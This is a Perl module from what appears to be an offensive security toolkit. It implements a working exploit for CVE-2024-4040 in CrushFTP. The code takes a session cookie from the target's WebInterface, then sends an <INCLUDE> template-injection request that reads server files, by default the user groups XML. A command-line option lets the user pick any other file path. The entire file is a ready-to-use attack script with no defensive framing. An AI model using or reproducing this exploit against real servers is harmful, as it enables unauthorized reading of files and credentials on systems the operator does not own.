package Spellbook::Advisory::CVE_2024_4040 {
    use strict;
    use warnings;
    use Getopt::Long;
    use Spellbook::Core::UserAgent;
    use HTTP::Cookies;

    sub new {
        my ($self, $parameters) = @_;
        my ($target, $help, @result);

        my $payload = "users/MainUsers/groups.XML";

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            "target=s"  => \$target,
            "payload=s" => \$payload,
            "help"      => \$help
        );
    
        if ($target) {
            if ($target !~ /^http(s)?:\/\//x) {
                $target = "https://$target";
            }
            
            my $endpoint   = "$target/WebInterface/";
            my $userAgent  = Spellbook::Core::UserAgent -> new();
            my $cookie_jar = HTTP::Cookies -> new();
            
            $userAgent -> cookie_jar($cookie_jar);
            
            my $response = $userAgent -> post($endpoint);

            $cookie_jar -> extract_cookies($response);
            $cookie_jar -> save();

            my $cookies = $response -> header("Set-Cookie");

            if ($cookies =~ /currentAuth=([^;]+)/x) {                
                $response = $userAgent -> post($endpoint, 
                    Content_Type => "application/x-www-form-urlencoded", 
                    Content => "command=exists&paths=<INCLUDE>$payload</INCLUDE>&c2f=$1"
                );
                
                push @result, $response -> decoded_content();
            }

            return @result;
        }

        if ($help) {
            return "
                \rAdvisory::CVE_2024_4040
                \r========================================
                \r-h, --help      See this menu
                \r-u, --target    Define the targeted CrushFTP server URL
                \r-p, --payload   Set the payload to run on the target\n\n";
        }

        return 0;
    }

}

1;
